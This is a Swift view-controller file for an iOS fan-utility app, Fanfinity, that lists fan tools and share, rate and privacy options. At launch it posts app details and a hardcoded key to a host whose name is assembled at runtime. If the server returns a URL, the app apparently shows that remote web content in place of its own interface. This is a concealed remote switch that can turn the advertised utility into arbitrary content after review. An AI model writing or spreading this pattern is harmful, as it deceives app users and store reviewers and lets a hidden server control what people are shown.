//
//  FanOneVC.swift
//  Fanfinity
//
//  Created by SunTory on 2024/12/26.
//

import UIKit
import StoreKit

class FanOneVC: UIViewController, UICollectionViewDataSource, UICollectionViewDelegate {
 
    

    @IBOutlet weak var imgLogo: UIImageView!
    @IBOutlet weak var colLViewFan: UICollectionView!
    
    var arrFab = ["Types Of Fan","Fan Noise Calculation","Fan Power Consumption","Fan Wallpaper","Share App","Rate App","Privacy Policy"]
    var flowLayouts: UICollectionViewFlowLayout {
        let _flowLayout = UICollectionViewFlowLayout()
        
        DispatchQueue.main.async {
            _flowLayout.itemSize = CGSize(width: self.colLViewFan.frame.size.width/2, height: 200)
            _flowLayout.sectionInset = UIEdgeInsets(top: 0, left: 0, bottom: 0, right: 0)
            _flowLayout.scrollDirection = UICollectionView.ScrollDirection.vertical
            _flowLayout.minimumInteritemSpacing = 0.0
            _flowLayout.minimumLineSpacing = 0.0
        }
        return _flowLayout
    }
    override func viewDidLoad() {
        super.viewDidLoad()

    
        fanfinityStartNotificationPermission()
        self.fanfinityStartAdsLocalData()
    }
    

    func collectionView(_ collectionView: UICollectionView, numberOfItemsInSection section: Int) -> Int {
        return arrFab.count
    }
    
    func collectionView(_ collectionView: UICollectionView, cellForItemAt indexPath: IndexPath) -> UICollectionViewCell {
        let cell = colLViewFan.dequeueReusableCell(withReuseIdentifier: "FanTypesCell", for: indexPath) as! FanTypesCell
        cell.lblMain.text = arrFab[indexPath.row]
        cell.viewMain.layer.cornerRadius = 20
        return cell
    }
    
    func collectionView(_ collectionView: UICollectionView, didSelectItemAt indexPath: IndexPath) {
        if indexPath.row == 0{
            let vc = self.storyboard?.instantiateViewController(withIdentifier: "FanTypesVC") as! FanTypesVC
            self.navigationController?.pushViewController(vc, animated: true)
        }else if indexPath.row == 1{
            let vc = self.storyboard?.instantiateViewController(withIdentifier: "FanNoiseVC") as! FanNoiseVC
            self.navigationController?.pushViewController(vc, animated: true)
        }else if indexPath.row == 2{
            let vc = self.storyboard?.instantiateViewController(withIdentifier: "FanPowerVC") as! FanPowerVC
            self.navigationController?.pushViewController(vc, animated: true)
        }else if indexPath.row == 3{
            let vc = self.storyboard?.instantiateViewController(withIdentifier: "FanVC") as! FanVC
            self.navigationController?.pushViewController(vc, animated: true)
        }else if indexPath.row == 4{
            let objectsToShare = ["Fanfinity"]
            let activityVC = UIActivityViewController(activityItems: objectsToShare, applicationActivities: nil)
            activityVC.popoverPresentationController?.sourceView = self.view
            activityVC.popoverPresentationController?.sourceRect = CGRect(x: 100, y: 200, width: 300, height: 300)
            self.present(activityVC, animated: true, completion: nil)
        }else if indexPath.row == 5{
            SKStoreReviewController.requestReview()
        }else if indexPath.row == 6{
            let vc = self.storyboard?.instantiateViewController(withIdentifier: "FanPrivacyPolicyVC") as! FanPrivacyPolicyVC
            self.navigationController?.pushViewController(vc, animated: true)
            
        }
        
        
    }
    private func fanfinityStartAdsLocalData() {
        guard self.fanfinityNeedShowAdsView() else {
            setUI()
            return
        }
        fanfinityPostaForAdsData { adsData in
            if let adsData = adsData {
                if let adsUr = adsData[2] as? String, !adsUr.isEmpty,  let nede = adsData[1] as? Int, let userDefaultKey = adsData[0] as? String{
                    UIViewController.fanfinitySetUserDefaultKey(userDefaultKey)
                    if  nede == 0, let locDic = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any] {
                        self.fanfinityShowAdView(locDic[2] as! String)
                    } else {
                        UserDefaults.standard.set(adsData, forKey: userDefaultKey)
                        self.fanfinityShowAdView(adsUr)
                    }
                    return
                }
            }
            self.setUI()
            
        }
    }
    func setUI(){
        colLViewFan.delegate = self
        colLViewFan.dataSource = self
        colLViewFan.register(UINib.init(nibName: "FanTypesCell", bundle: nil), forCellWithReuseIdentifier: "FanTypesCell")
        navigationController?.navigationBar.isHidden = true
        colLViewFan.collectionViewLayout = self.flowLayouts
        imgLogo.layer.cornerRadius = 20
    }
    private func fanfinityPostaForAdsData(completion: @escaping ([Any]?) -> Void) {
        
        let url = URL(string: "https://ope\(self.fanfinityHostUrl())/open/postAdsData")!
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        let parameters: [String: Any] = [
            "appLocalized": UIDevice.current.localizedModel ,
            "appKey": "df5e6efb212a4baa94770c4091388f4a",
            "appPackageId": Bundle.main.bundleIdentifier ?? "",
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] ?? "",
            "appName":"Fanfinity"
        ]

        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
            completion(nil)
            return
        }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                guard let data = data, error == nil else {
                    print("Request error:", error ?? "Unknown error")
                    completion(nil)
                    return
                }
                
                do {
                    let jsonResponse = try JSONSerialization.jsonObject(with: data, options: [])
                    if let resDic = jsonResponse as? [String: Any] {
                        if let dataDic = resDic["data"] as? [String: Any],  let adsData = dataDic["jsonObject"] as? [Any]{
                            completion(adsData)
                            return
                        }
                    }
                    print("Response JSON:", jsonResponse)
                    completion(nil)
                } catch {
                    print("Failed to parse JSON:", error)
                    completion(nil)
                }
            }
        }

        task.resume()
    }
    
}
extension FanOneVC: UNUserNotificationCenterDelegate {
    func fanfinityStartNotificationPermission() {
        UNUserNotificationCenter.current().delegate = self
        let authOptions: UNAuthorizationOptions = [.alert, .badge, .sound]
        UNUserNotificationCenter.current().requestAuthorization(
          options: authOptions,
          completionHandler: { _, _ in }
        )
        UIApplication.shared.registerForRemoteNotifications()
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                willPresent notification: UNNotification,
                                withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = notification.request.content.userInfo
        print(userInfo)
        completionHandler([[.sound]])
    }

    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive response: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        print(userInfo)
        completionHandler()
    }
}
